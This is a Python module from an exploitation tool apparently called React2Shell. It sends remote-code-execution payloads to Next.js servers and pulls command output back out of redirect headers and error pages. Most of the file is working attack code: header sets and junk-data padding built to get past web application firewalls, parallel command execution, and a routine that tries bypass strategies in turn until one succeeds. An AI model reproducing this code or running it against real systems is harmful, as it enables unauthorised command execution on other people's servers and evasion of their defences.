"""Command execution and payload sending for React2Shell."""

import re
import base64
import time
import requests
from typing import Optional, Dict, Any, Tuple
from urllib.parse import urlparse, urljoin, unquote
from requests.exceptions import RequestException
from threading import Lock

from ..classes.payload import PayloadBuilder, PayloadWarmer
from ..utils.helpers import extract_result_from_redirect
from ..utils.colors import Colors, colorize


# Global rate limiter
_rate_limiter = None
_rate_limiter_lock = Lock()


class RateLimiter:
    """Simple rate limiter for requests per second."""
    def __init__(self, rate: float):
        self.rate = rate  # requests per second
        self.min_interval = 1.0 / rate if rate > 0 else 0
        self.last_request_time = 0
        self.lock = Lock()
    
    def wait(self):
        """Wait if necessary to maintain rate limit."""
        if self.rate <= 0:
            return
        
        with self.lock:
            current_time = time.time()
            elapsed = current_time - self.last_request_time
            
            if elapsed < self.min_interval:
                sleep_time = self.min_interval - elapsed
                time.sleep(sleep_time)
            
            self.last_request_time = time.time()


def get_rate_limiter(rate: Optional[float] = None) -> Optional[RateLimiter]:
    """Get or create global rate limiter."""
    global _rate_limiter
    
    if rate is None or rate <= 0:
        return None
    
    with _rate_limiter_lock:
        if _rate_limiter is None or _rate_limiter.rate != rate:
            _rate_limiter = RateLimiter(rate)
        return _rate_limiter


def get_waf_bypass_headers(strategy: str = "default") -> dict:
    """Get different header combinations for WAF bypass."""
    strategies = {
        "default": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Next-Action": "x",
            "X-Nextjs-Request-Id": "b5dce965",
            "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
        },
        "chrome_latest": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Next-Action": "x",
            "X-Nextjs-Request-Id": "b5dce965",
            "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
            "Referer": "https://www.google.com/",
        },
        "firefox": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Next-Action": "x",
            "X-Nextjs-Request-Id": "b5dce965",
            "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
        },
        "minimal": {
            "User-Agent": "Mozilla/5.0",
            "Next-Action": "x",
            "X-Nextjs-Request-Id": "b5dce965",
        },
        "assetnote": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0",
            "Next-Action": "x",
            "X-Nextjs-Request-Id": "b5dce965",
            "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
        }
    }
    return strategies.get(strategy, strategies["default"])


def _is_valid_base64(s: str) -> bool:
    """Check if string is valid base64."""
    try:
        if not s or len(s) < 4:
            return False
        base64_chars = set('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=')
        if not all(c in base64_chars for c in s):
            return False
        decoded = base64.b64decode(s, validate=True)
        decoded.decode('utf-8')
        return True
    except Exception:
        return False


def _is_readable_text(text: str) -> bool:
    """Check if text looks like readable command output (not binary garbage)."""
    if not text or len(text) < 2:
        return False
    printable_ratio = sum(1 for c in text if c.isprintable() or c in '\n\r\t') / len(text)
    if printable_ratio < 0.7:
        return False
    control_chars = sum(1 for c in text if ord(c) < 32 and c not in '\n\r\t')
    if control_chars > len(text) * 0.1:
        return False
    return True


def _is_nextjs_404_page(response: requests.Response) -> bool:
    """Detect if response is a Next.js 404 error page."""
    if not response or not response.text:
        return False
    
    text = response.text.lower()
    url = response.url.lower() if hasattr(response, 'url') else ""
    
    nextjs_404_indicators = [
        'this page could not be found',
        '404',
        'page not found',
        'next.js 404',
        '__next',
        'nextjs',
        'application/octet-stream',
    ]
    
    text_indicators = sum(1 for indicator in nextjs_404_indicators if indicator in text)
    status_404 = response.status_code == 404
    is_nextjs = any(header in response.headers for header in ['x-nextjs-cache', 'x-nextjs-request-id', 'x-nextjs-html-request-id'])
    
    if status_404 and (is_nextjs or text_indicators >= 2):
        return True
    
    if text_indicators >= 3 and not _has_command_output(text):
        return True
    
    if ('<!doctype html>' in text or '<html' in text) and text_indicators >= 2:
        if not _has_command_output(text):
            return True
    
    return False


def _has_command_output(text: str) -> bool:
    """Check if text contains actual command output (not just error pages)."""
    if not text:
        return False
    
    output_indicators = [
        r'[a-z0-9_\-\.]+\.(json|js|ts|env|txt|md|yml|yaml|conf|config)',
        r'\{[^}]{10,}\}',
        r'[a-z_]+=[a-z0-9_\-/]+',
        r'#!/bin/(sh|bash)',
        r'export\s+[A-Z_]+=',
        r'process\.env\.',
    ]
    
    for pattern in output_indicators:
        if re.search(pattern, text, re.IGNORECASE):
            return True
    
    if len(text) > 200 and text.count('\n') > 5:
        text_without_tags = re.sub(r'<[^>]+>', '', text)
        if len(text_without_tags) > 100:
            return True
    
    return False


def extract_result(response: requests.Response, base64_encoded: bool = True) -> Optional[str]:
    """Extract command result from response using multiple methods."""
    redirect_header = response.headers.get("X-Action-Redirect", "")
    location_header = response.headers.get("Location", "")
    
    for header in [redirect_header, location_header]:
        if header:
            patterns = [
                r'/login\?a=([^;&\s]+)',           # Standard format
                r'login\?a=([^;&\s]+)',            # Without leading slash
                r'[?&]a=([^;&\s]+)',               # Any a= parameter
                r'[?&]result=([^;&\s]+)',          # Alternative parameter name
                r'[?&]output=([^;&\s]+)',          # Another alternative
                r'[?&]error=([^;&\s]+)',           # Error parameter
                r'[?&]msg=([^;&\s]+)',            # Message parameter
            ]
            for pattern in patterns:
                match = re.search(pattern, header)
                if match:
                    result = match.group(1)
                    try:
                        decoded = unquote(result)
                        
                        # First, try as plain text (might be URL-encoded error message)
                        if not base64_encoded:
                            # Check if it looks like readable text already
                            if _is_readable_text(decoded) and len(decoded) > 2:
                                return decoded
                        
                        if base64_encoded:
                            # Try base64 decode if it looks like valid base64
                            if _is_valid_base64(decoded):
                                try:
                                    decoded_bytes = base64.b64decode(decoded, validate=True)
                                    output = decoded_bytes.decode('utf-8', errors='replace')
                                    # Only return if it looks like readable text
                                    if _is_readable_text(output):
                                        return output
                                    # If not readable, try the decoded as-is
                                    return decoded
                                except Exception:
                                    return decoded
                            else:
                                # Not valid base64 - might be URL-encoded plain text
                                # Check if it looks like readable text
                                if _is_readable_text(decoded) and len(decoded) > 2:
                                    return decoded
                                # Return as-is if it's not empty
                                if decoded:
                                    return decoded
                        else:
                            # Not base64 encoded, return decoded
                            if decoded:
                                return decoded
                    except Exception:
                        # If decoding fails, return raw result
                        if result:
                            return result
    
    if response.text:
        try:
            data = response.json()
            if isinstance(data, dict):
                for field in ['error', 'output', 'result', 'message', 'data']:
                    value = data.get(field, "")
                    if value and isinstance(value, str):
                        if "login?a=" in value:
                            match = re.search(r'login\?a=([^;&\s]+)', value)
                            if match:
                                decoded = unquote(match.group(1))
                                if base64_encoded:
                                    if _is_valid_base64(decoded):
                                        try:
                                            decoded_bytes = base64.b64decode(decoded, validate=True)
                                            output = decoded_bytes.decode('utf-8', errors='replace')
                                            if output and output.strip() and _is_readable_text(output):
                                                return output
                                            return decoded
                                        except Exception:
                                            return decoded
                                    else:
                                        return decoded
                                else:
                                    return decoded
                        elif len(value) > 0 and not value.startswith('http'):
                            return value
        except:
            pass
        
        text = response.text
        
        nextjs_error_patterns = [
            r'"message"\s*:\s*"([^"]+)"',
            r'"error"\s*:\s*"([^"]+)"',
            r'message["\']?\s*[:=]\s*["\']?([^"\']+)',
        ]
        for pattern in nextjs_error_patterns:
            matches = re.findall(pattern, text, re.IGNORECASE)
            for match in matches:
                if match and len(match) > 3:
                    if not any(skip in match.lower() for skip in ['http', 'redirect', 'login', 'error code']):
                        if ':' in match or '/bin/' in match or 'not found' in match.lower():
                            return match.strip()
        
        error_patterns = [
            r'(/bin/sh:\s*\d+:\s*[^:]+:\s*[^\n]+)',  # /bin/sh: 1: ps: not found
            r'(ls:|cat:|which:|command failed:|cannot access|No such file|Command:)([^\n"\'<>]+)',
            r'stderr[:\s]+([^\n"\'<>]+)',
            r'stdout[:\s]+([^\n"\'<>]+)',
        ]
        for pattern in error_patterns:
            match = re.search(pattern, text, re.IGNORECASE | re.DOTALL)
            if match:
                output = match.group(2 if len(match.groups()) > 1 else 1).strip()
                if output:
                    output = re.sub(r'\s+', ' ', output)
                    return output
        
        stderr_match = re.search(r'stderr.*?Buffer\s+([0-9a-f\s]+)', text, re.IGNORECASE)
        if stderr_match:
            try:
                hex_data = stderr_match.group(1).replace(' ', '')
                decoded = bytes.fromhex(hex_data).decode('utf-8', errors='replace')
                if decoded.strip():
                    return decoded.strip()
            except:
                pass
        
        base64_patterns = [
            r'[A-Za-z0-9+/]{20,}={0,2}',
        ]
        for pattern in base64_patterns:
            matches = re.findall(pattern, text)
            for match in matches:
                if _is_valid_base64(match):
                    try:
                        decoded = base64.b64decode(match, validate=True)
                        output = decoded.decode('utf-8', errors='replace')
                        # Only return if it looks like readable command output
                        if output and _is_readable_text(output) and (('\n' in output) or len(output) > 10):
                            return output
                    except Exception:
                        continue
        
        # Pattern 4: Look for output in HTML comments or script tags
        html_patterns = [
            r'<!--\s*([^>]+)\s*-->',
            r'<script[^>]*>([^<]+)</script>',
        ]
        for pattern in html_patterns:
            matches = re.findall(pattern, text, re.IGNORECASE | re.DOTALL)
            for match in matches:
                if match and len(match.strip()) > 0 and not match.startswith('http'):
                    return match.strip()
    
    return None


def send_payload(
    target_url: str,
    command: str,
    timeout: int = 10,
    verify_ssl: bool = True,
    windows: bool = False,
    base64_encode: bool = True,
    waf_bypass: bool = False,
    waf_bypass_size_kb: int = 128,
    vercel_waf_bypass: bool = False,
    header_strategy: str = "default",
    randomize: bool = False,
    follow_redirects: bool = True,
    proxies: Optional[Dict] = None
) -> Tuple[Optional[requests.Response], Optional[str], Optional[requests.Response]]:
    """Send RCE payload and return response."""
    try:
        body, content_type = PayloadBuilder.build_rce_payload(
            command, windows=windows, base64_encode=base64_encode,
            waf_bypass=waf_bypass, waf_bypass_size_kb=waf_bypass_size_kb,
            vercel_waf_bypass=vercel_waf_bypass, randomize=randomize
        )
        
        headers = get_waf_bypass_headers(header_strategy)
        headers["Content-Type"] = content_type
        
        # First, send without following redirects
        # Handle timeout=0 (no timeout)
        request_timeout = None if timeout == 0 else timeout
        initial_response = requests.post(
            target_url,
            headers=headers,
            data=body.encode('utf-8'),
            timeout=request_timeout,
            verify=verify_ssl,
            allow_redirects=False,
            proxies=proxies
        )
        
        # Follow redirects if requested (ORIGINAL WORKING LOGIC)
        if follow_redirects and initial_response.status_code in [301, 302, 303, 307, 308]:
            location = initial_response.headers.get("Location", "")
            if location:
                if location.startswith("/"):
                    parsed = urlparse(target_url)
                    redirect_url = f"{parsed.scheme}://{parsed.netloc}{location}"
                elif not location.startswith("http"):
                    redirect_url = urljoin(target_url, location)
                else:
                    redirect_url = location
                
                try:
                    final_response = requests.post(
                        redirect_url,
                        headers=headers,
                        data=body.encode('utf-8'),
                        timeout=request_timeout,
                        verify=verify_ssl,
                        allow_redirects=False,  # Only follow one level (ORIGINAL)
                        proxies=proxies
                    )
                    return final_response, None, initial_response
                except Exception:
                    return initial_response, None, None
        
        return initial_response, None, None
    except requests.exceptions.SSLError as e:
        return None, f"SSL Error: {str(e)} (try --insecure to bypass)", None
    except requests.exceptions.ConnectionError as e:
        return None, f"Connection Error: {str(e)} (check if server is reachable)", None
    except requests.exceptions.Timeout:
        return None, f"Request timed out after {timeout}s (server may be slow or blocking)", None
    except requests.exceptions.TooManyRedirects:
        return None, "Too many redirects (server may be blocking)", None
    except RequestException as e:
        return None, f"Request failed: {str(e)}", None
    except Exception as e:
        return None, f"Unexpected error: {str(e)}", None


# Global payload warmer instance
_payload_warmer = PayloadWarmer()


def execute_command(
    target_url: str,
    command: str,
    timeout: int = 10,
    verify_ssl: bool = True,
    windows: bool = False,
    base64_encode: bool = True,
    waf_bypass: bool = False,
    waf_bypass_size_kb: int = 128,
    vercel_waf_bypass: bool = False,
    header_strategy: str = "default",
    randomize: bool = False,
    auto_warm: bool = False,
    follow_redirects: bool = True,
    proxies: Optional[Dict] = None,
    rate_limit: Optional[float] = None,
    delay: Optional[float] = None
) -> Dict[str, Any]:
    """Execute a command via RCE and return result."""
    result = {
        "success": False,
        "command": command,
        "output": None,
        "error": None,
        "status_code": None,
        "vulnerable": False,
        "raw_response": None,
        "target": target_url
    }
    
    # Rate limiting
    if rate_limit:
        limiter = get_rate_limiter(rate_limit)
        if limiter:
            limiter.wait()
    
    # Delay between requests
    if delay:
        time.sleep(delay)
    
    # Auto-warm payloads if requested
    if auto_warm:
        config = {
            "timeout": timeout,
            "verify_ssl": verify_ssl,
            "windows": windows,
            "base64_encode": base64_encode,
            "waf_bypass": waf_bypass,
            "waf_bypass_size_kb": waf_bypass_size_kb,
            "vercel_waf_bypass": vercel_waf_bypass,
            "header_strategy": header_strategy,
            "randomize": randomize
        }
        optimized_config = _payload_warmer.warm_payload(target_url, command, config)
        base64_encode = optimized_config.get("base64_encode", base64_encode)
        waf_bypass = optimized_config.get("waf_bypass", waf_bypass)
        waf_bypass_size_kb = optimized_config.get("waf_bypass_size_kb", waf_bypass_size_kb)
        vercel_waf_bypass = optimized_config.get("vercel_waf_bypass", vercel_waf_bypass)
        header_strategy = optimized_config.get("header_strategy", header_strategy)
        randomize = optimized_config.get("randomize", randomize)
    
    response, error, initial_response = send_payload(
        target_url, command, timeout, verify_ssl, windows,
        base64_encode, waf_bypass, waf_bypass_size_kb,
        vercel_waf_bypass, header_strategy, randomize,
        follow_redirects, proxies
    )
    
    if error:
        result["error"] = error
        if "SSL" in error:
            result["error"] += " | Tip: Use --insecure to bypass SSL verification"
        elif "Connection" in error or "timed out" in error:
            result["error"] += " | Tip: Check if server is reachable, behind Cloudflare, or blocking requests"
        return result
    
    if not response:
        result["error"] = "No response received (connection may have been blocked or timed out)"
        return result
    
    result["status_code"] = response.status_code
    result["raw_response"] = response.text[:2000] if response.text else ""
    
    if initial_response:
        redirect_url = initial_response.headers.get("Location", "") or initial_response.headers.get("X-Action-Redirect", "")
        if redirect_url:
            result["redirect_url"] = redirect_url
        
        initial_output = extract_result(initial_response, base64_encoded=base64_encode)
        if initial_output:
            # Only check for 404 if we're really sure (status 404 + clear indicators)
            # Otherwise trust the extraction logic
            if initial_response.status_code == 404 and _is_nextjs_404_page(initial_response) and not _has_command_output(initial_output):
                result["success"] = False
                result["vulnerable"] = True
                result["error"] = "Command or file not found (Next.js 404 page detected)"
                result["is_404"] = True
                return result
            # Use extracted output if we have it
            result["success"] = True
            result["output"] = initial_output
            result["vulnerable"] = True
            return result
        
        if redirect_url:
            # Check if redirect URL indicates 404
            if '404' in redirect_url.lower() or 'not-found' in redirect_url.lower() or '_not-found' in redirect_url.lower():
                result["success"] = False
                result["vulnerable"] = True
                result["error"] = "Command or file not found (404 redirect detected)"
                result["is_404"] = True
                return result
            
            url_params = re.findall(r'[?&]([^=]+)=([^;&]+)', redirect_url)
            for param_name, param_value in url_params:
                if param_name.lower() in ['a', 'result', 'output', 'error', 'msg']:
                    try:
                        decoded = unquote(param_value)
                        # Only treat as success if it has actual command output
                        if _is_readable_text(decoded) and len(decoded) > 2 and _has_command_output(decoded):
                            result["success"] = True
                            result["output"] = decoded
                            result["vulnerable"] = True
                            return result
                        if base64_encode and _is_valid_base64(decoded):
                            try:
                                decoded_bytes = base64.b64decode(decoded, validate=True)
                                output = decoded_bytes.decode('utf-8', errors='replace')
                                if _is_readable_text(output) and _has_command_output(output):
                                    result["success"] = True
                                    result["output"] = output
                                    result["vulnerable"] = True
                                    return result
                            except Exception:
                                pass
                    except Exception:
                        pass
    
    output = extract_result(response, base64_encoded=base64_encode)
    
    if output:
        # Only mark as 404 if status is 404 AND we're really sure it's a 404 page
        # Otherwise trust the extraction logic
        if response.status_code == 404 and _is_nextjs_404_page(response) and not _has_command_output(output):
            result["success"] = False
            result["vulnerable"] = True
            result["error"] = "Command or file not found (Next.js 404 detected)"
            result["is_404"] = True
        else:
            # Use extracted output
            result["success"] = True
            result["output"] = output
            result["vulnerable"] = True
    else:
        # Check redirect status codes - but verify it's not a 404 redirect
        if response.status_code in [301, 302, 303, 307, 308]:
            location = response.headers.get("Location", "")
            redirect_header = response.headers.get("X-Action-Redirect", "")
            
            # First check if this is a 404 redirect
            if location and ('404' in location.lower() or 'not-found' in location.lower() or '_not-found' in location.lower()):
                result["success"] = False
                result["vulnerable"] = True
                result["error"] = "Command or file not found (404 redirect detected)"
                result["is_404"] = True
                return result
            
            # Check if redirect URL contains actual output
            extracted_output = None
            for header_value in [location, redirect_header]:
                if header_value and ("/login?a=" in header_value or "login?a=" in header_value):
                    match = re.search(r'login\?a=([^;&\s]+)', header_value)
                    if match:
                        try:
                            decoded = unquote(match.group(1))
                            if base64_encode:
                                # Only decode if it's valid base64
                                if _is_valid_base64(decoded):
                                    try:
                                        decoded_bytes = base64.b64decode(decoded, validate=True)
                                        decoded_output = decoded_bytes.decode('utf-8', errors='replace')
                                        # Only use if it's readable text and has actual content
                                        if _is_readable_text(decoded_output) and _has_command_output(decoded_output):
                                            extracted_output = decoded_output
                                            break
                                    except Exception:
                                        # If base64 decode fails, check if plain text is readable
                                        if _is_readable_text(decoded) and _has_command_output(decoded):
                                            extracted_output = decoded
                                            break
                                else:
                                    # Not valid base64, check if it's readable text
                                    if _is_readable_text(decoded) and _has_command_output(decoded):
                                        extracted_output = decoded
                                        break
                            else:
                                # Not base64 encoded, check if readable
                                if _is_readable_text(decoded) and _has_command_output(decoded):
                                    extracted_output = decoded
                                    break
                        except:
                            pass
            
            # If we extracted actual output, use it
            if extracted_output:
                result["success"] = True
                result["output"] = extracted_output
                result["vulnerable"] = True
                return result
            
            # No output extracted from redirect - likely a 404
            result["vulnerable"] = True
            result["success"] = False
            result["error"] = "Command or file not found (redirect detected but no output)"
            result["is_404"] = True
            return result
        
        elif response.status_code in [400, 403]:
            result["error"] = "Request blocked (server may be protected)"
        elif response.status_code == 500:
            if "Command failed" in response.text or "digest" in response.text:
                result["vulnerable"] = True
                error_msg = re.search(r'(ls:|cat:|cannot access|No such file|Command failed:)([^\n]+)', response.text, re.IGNORECASE)
                if error_msg:
                    result["error"] = f"Command failed: {error_msg.group(2).strip()}"
                    result["output"] = error_msg.group(2).strip()
                    result["success"] = True
                else:
                    result["error"] = "Server error - command may have executed but failed (check server logs)"
            else:
                result["error"] = "Server error (status 500) - check server logs for details"
        else:
            result["error"] = f"Unexpected response (status {response.status_code})"
    
    return result


def execute_parallel_commands(
    target_url: str,
    commands: list[str],
    max_workers: int = 5,
    timeout: int = 10,
    verify_ssl: bool = True,
    windows: bool = False,
    base64_encode: bool = True,
    waf_bypass: bool = False,
    waf_bypass_size_kb: int = 128,
    vercel_waf_bypass: bool = False,
    header_strategy: str = "default",
    randomize: bool = False,
    auto_warm: bool = False,
    follow_redirects: bool = True,
    proxies: Optional[Dict] = None
) -> list[Dict[str, Any]]:
    """Execute multiple commands in parallel."""
    from concurrent.futures import ThreadPoolExecutor, as_completed
    from threading import Lock
    
    try:
        from tqdm import tqdm
        has_tqdm = True
    except ImportError:
        has_tqdm = False
    
    results = []
    results_lock = Lock()
    
    def execute_single(cmd: str) -> Dict[str, Any]:
        result = execute_command(
            target_url, cmd, timeout, verify_ssl, windows,
            base64_encode, waf_bypass, waf_bypass_size_kb,
            vercel_waf_bypass, header_strategy, randomize,
            auto_warm, follow_redirects, proxies
        )
        result["command"] = cmd
        return result
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_cmd = {executor.submit(execute_single, cmd): cmd for cmd in commands}
        
        if has_tqdm:
            futures = tqdm(as_completed(future_to_cmd), total=len(commands), desc="Executing commands")
        else:
            futures = as_completed(future_to_cmd)
        
        for future in futures:
            try:
                result = future.result()
                with results_lock:
                    results.append(result)
            except Exception as e:
                with results_lock:
                    results.append({
                        "success": False,
                        "command": future_to_cmd[future],
                        "error": str(e)
                    })
    
    return results


def test_with_waf_bypass(
    target_url: str,
    timeout: int = 10,
    verify_ssl: bool = True,
    windows: bool = False
) -> Dict[str, Any]:
    """Test vulnerability with multiple WAF bypass techniques."""
    from ..utils.helpers import print_section_header
    
    print_section_header("WAF BYPASS TESTING")
    print(colorize("[*] Testing with WAF bypass techniques...", Colors.CYAN))
    
    test_command = "echo $((41*271))" if not windows else "powershell -c \"41*271\""
    
    bypass_strategies = [
        {"name": "Standard", "waf_bypass": False, "vercel": False, "header": "default"},
        {"name": "Junk Data (128KB)", "waf_bypass": True, "vercel": False, "header": "default", "size": 128},
        {"name": "Junk Data (256KB)", "waf_bypass": True, "vercel": False, "header": "default", "size": 256},
        {"name": "Vercel WAF Bypass", "waf_bypass": False, "vercel": True, "header": "default"},
        {"name": "Chrome Latest Headers", "waf_bypass": False, "vercel": False, "header": "chrome_latest"},
        {"name": "Firefox Headers", "waf_bypass": False, "vercel": False, "header": "firefox"},
        {"name": "Minimal Headers", "waf_bypass": False, "vercel": False, "header": "minimal"},
        {"name": "Assetnote Headers", "waf_bypass": False, "vercel": False, "header": "assetnote"},
        {"name": "Junk + Vercel", "waf_bypass": True, "vercel": True, "header": "default", "size": 128},
    ]
    
    results = []
    for strategy in bypass_strategies:
        print(f"\n[*] Trying: {strategy['name']}...")
        waf_size = strategy.get("size", 128)
        result = execute_command(
            target_url, test_command, timeout, verify_ssl, windows,
            base64_encode=False, waf_bypass=strategy["waf_bypass"],
            waf_bypass_size_kb=waf_size, vercel_waf_bypass=strategy["vercel"],
            header_strategy=strategy["header"]
        )
        
        result["strategy"] = strategy["name"]
        results.append(result)
        
        if result["vulnerable"] and result["output"] == "11111":
            print(colorize(f"[+] SUCCESS with {strategy['name']}!", Colors.GREEN + Colors.BOLD))
            return result
        elif result.get("status_code") == 500 and result.get("vulnerable"):
            print(colorize(f"[!] Command executed with {strategy['name']} (server vulnerable)", Colors.YELLOW))
        elif result.get("status_code") in [400, 403]:
            print(colorize(f"[-] Blocked with {strategy['name']}", Colors.RED))
        else:
            print(colorize(f"[?] No clear result with {strategy['name']} (status: {result.get('status_code', 'N/A')})", Colors.CYAN))
        
        time.sleep(0.5)
    
    for r in results:
        if r.get("vulnerable"):
            return r
    
    return results[0] if results else {"error": "All bypass attempts failed"}

